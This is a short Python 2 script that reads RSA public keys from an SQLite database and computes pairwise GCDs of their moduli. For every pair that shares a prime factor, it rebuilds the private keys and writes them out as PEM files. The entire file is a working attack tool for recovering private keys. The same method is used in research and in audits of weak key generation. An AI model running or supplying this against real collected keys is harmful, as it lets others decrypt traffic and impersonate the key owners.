#!/usr/bin/python
'''
   Finds all the key pairs that have non-1 GCDs
'''

import Crypto
from Crypto.PublicKey import RSA
import fractions
import itertools
import operator
import sqlite3
import sys

def extEuclideanAlg(a, b) :
   """
   Computes a solution  to a x + b y = gcd(a,b), as well as gcd(a,b)
   """
   if b == 0 :
      return 1,0,a
   else :
      x, y, gcd = extEuclideanAlg(b, a % b)
      return y, x - y * (a // b),gcd
def modInvEuclid(a,m) :
   """
   Computes the modular multiplicative inverse of a modulo m,
   using the extended Euclidean algorithm
   """
   x,y,gcd = extEuclideanAlg(a,m)
   if gcd == 1 :
      return x % m
   else :
      return None


'''
Given the two RSA keys and their GCD, find the private data and build a new
private key with that info
'''
def findD(p, q, e):
   d = 1
   phi = (p - 1) * (q - 1)

   print 'phi=' + str(phi)
   print 'e=' + str(e)

   d = modInvEuclid(e, phi)
   
   print 'd was ' + str(d)
   return d

def processVulnKeys(common, pair):
   k1 = pair[0].origKey
   k2 = pair[1].origKey
   
   p1 = k1.n / common
   p2 = k2.n / common

   #this is the vulnerability
   q1 = common
   q2 = common

   #manually find these from the other params
   d1 = findD(p1, q1, k1.e)
   d2 = findD(p2, q2, k2.e)

   print 'p1 = ' + str(p1)
   print 'q1 = ' + str(q1)
   print 'p1.e = ' + str(k1.e)

   print 'p2 = ' + str(p2)
   print 'q1 = ' + str(q1)
   print 'p2.e = ' + str(k2.e)

   '''
   A tuple of long integers, with at least 2 and no more than 6 items. The items come in the following order:
   RSA modulus (n).
   Public exponent (e).
   Private exponent (d). Only required if the key is private.
   First factor of n (p). Optional.
   Second factor of n (q). Optional.
   '''
   
   d1 = (k1.n, k1.e, d1, p1, q1)
   d2 = (k2.n, k2.e, d2, p2, q2)
   o = (RSA.construct(d1), RSA.construct(d2))

   return o

class vulnPair:
   origKey = None
   newKey = None
   origFileName = ''

   def __init__(self, origKey, origFileName, newKey = None):
      self.origKey = origKey
      self.newKey = newKey
      self.origFileName = origFileName

#==========================================
#         Actually starts here
#==========================================

allKeys = []
foundPrivateKeys = []

if len(sys.argv) != 2:
   print 'pass it db to use'
   exit(0)

dbCon = sqlite3.connect(sys.argv[1])
c = dbCon.cursor()
c.execute('''SELECT * FROM keys''')

i = 0
for l in c:
   pem = l[0]
   
   allKeys.append(vulnPair(origKey=RSA.importKey(pem), origFileName=str(i) + '.pem'))

   i = i + 1

print 'Got ' + str(len(allKeys)) + ' keys to process...'

'''
For every combination of keys, check fraction.gcd() is > 1
'''
for i in itertools.combinations(allKeys, 2):
   flaw = fractions.gcd(i[0].origKey.n, i[1].origKey.n)
   if flaw > 1: 
      print '=============== Got Pair ================'
      #now find the hidden parameters!
      res = processVulnKeys(flaw, i)
      i[0].newKey = res[0]
      i[1].newKey = res[1]
      foundPrivateKeys.append(i[0])
      foundPrivateKeys.append(i[1])

#foundPrivateKeys is the pair of orig keys p[0][0-1] and the pair of found keys p[1][0-1]
print 'Built ' + str(len(foundPrivateKeys)) + ' private keys from vuln data'
for p in foundPrivateKeys:
   dot = p.origFileName.find('.')
   name = p.origFileName[0:dot] + '.S' + '.pem'
   f = open(name, 'w')
   f.write(p.newKey.exportKey('PEM'))
   f.close()
